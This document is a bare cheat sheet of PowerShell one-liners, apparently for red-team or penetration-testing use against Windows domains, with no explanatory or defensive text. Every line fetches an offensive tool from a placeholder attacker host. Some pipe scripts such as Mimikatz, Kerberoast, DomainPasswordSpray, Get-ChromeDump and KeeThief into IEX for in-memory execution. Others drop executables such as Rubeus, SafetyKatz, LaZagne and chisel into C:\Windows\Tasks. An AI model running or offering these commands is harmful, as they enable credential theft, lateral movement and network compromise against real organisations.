(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/PowerView.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Brute-LocAdmin.ps1 ') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Copy-VSS.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Find-PSServiceAccounts.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Find-WMILocalAdminAccess.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Get-ComputerInfo.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Get-GPPAutologon.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Get-GPPPassword.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Get-HttpStatus.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Get-LocAdm.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Get-UserInfo.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/GetUserSPNs.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Get-VaultCredential.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Get-WLANPass.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/HostEnum.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Invoke-EDRChecker.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Invoke-Pbind.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Kerberoast.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/LAPSCredential.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Mimikatz.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Out-Minidump.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/PortScanner.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/PowerView.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/SecurityAssessment.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/SharpHound.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/VolumeShadowCopy.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/KeeThief.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Invoke-ACLScanner.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/ACLight/ACLight2.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/ADModule/Import-ActiveDirectory.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/ADReaper/ADReaper.exe') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/ADRecon/ADRecon.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/ASREPRoast/ASREPRoast.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/BrowersData/Get-BrowserData.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/BrowersData/Get-ChromeDump.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Certify/Certify.exe') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/DomainPasswordSpray/DomainPasswordSpray.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Get-LAPSPasswords/Get-LAPSPasswords.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Get-SPN/Get-SPN.psm1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Group3r/Group3r.exe') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Inveigh/Inveigh-Relay.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/LAPSToolkit/LAPSToolkit.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/NetCease/NetCease.psd1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/PoisonHandler/Execute-PoisonHandler.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/PowerSCCM/PowerSCCM.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/PowerUpSQL/PowerUpSQL.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/Powermad/Powermad.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/WSMan-WinRM/WSManWinRM.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/WSUSpendu/WSUSpendu.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/kerberoast/GetUserSPNs.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://<Your.IP.Here>/powercat/powercat.ps1') | IEX
iwr http://<Your.IP.Here>/SharpHound.exe -OutFile C:\\Windows\\Tasks\\SharpHound.exe
iwr http://<Your.IP.Here>/winPEAS.exe -OutFile C:\\Windows\\Tasks\\winPEAS.exe
iwr http://<Your.IP.Here>/LaZagne/lazagne.exe -OutFile C:\\Windows\\Tasks\\lazagne.exe
iwr http://<Your.IP.Here>/Responder-Windows/binaries/Responder/MultiRelay.exe -OutFile C:\\Windows\\Tasks\\MultiRelay.exe
iwr http://<Your.IP.Here>/Responder-Windows/binaries/Responder/Responder.exe -OutFile C:\\Windows\\Tasks\\Responder.exe
iwr http://<Your.IP.Here>/Rubeus/Rubeus.exe -OutFile C:\\Windows\\Tasks\\Rubeus.exe
iwr http://<Your.IP.Here>/SCShell/SCShell.exe -OutFile C:\\Windows\\Tasks\\SCShell.exe
iwr http://<Your.IP.Here>/SafetyKatz/SafetyKatz.exe  -OutFile C:\\Windows\\Tasks\\SafetyKatz.exe
iwr http://<Your.IP.Here>/Seatbelt/Seatbelt.exe -OutFile C:\\Windows\\Tasks\\Seatbelt.exe
iwr http://<Your.IP.Here>/SharpDPAPI/SharpDPAPI.exe -OutFile C:\\Windows\\Tasks\\SharpDPAPI.exe
iwr http://<Your.IP.Here>/SharpUp/SharpUp.exe -OutFile C:\\Windows\\Tasks\\SharpUp.exe
iwr http://<Your.IP.Here>/SharpView/SharpView.exe -OutFile C:\\Windows\\Tasks\\SharpView.exe
iwr http://<Your.IP.Here>/SharpWMI/SharpWMI.exe -OutFile C:\\Windows\\Tasks\\SharpWMI.exe
iwr http://<Your.IP.Here>/Snaffler/Snaffler.exe -OutFile C:\\Windows\\Tasks\\Snaffler.exe
iwr http://<Your.IP.Here>/chisel/chisel.exe -OutFile C:\\Windows\\Tasks\\chisel.exe
iwr http://<Your.IP.Here>/mimikatz/x64/mimikatz.exe -OutFile C:\\Windows\\Tasks\\mimikatz.exe
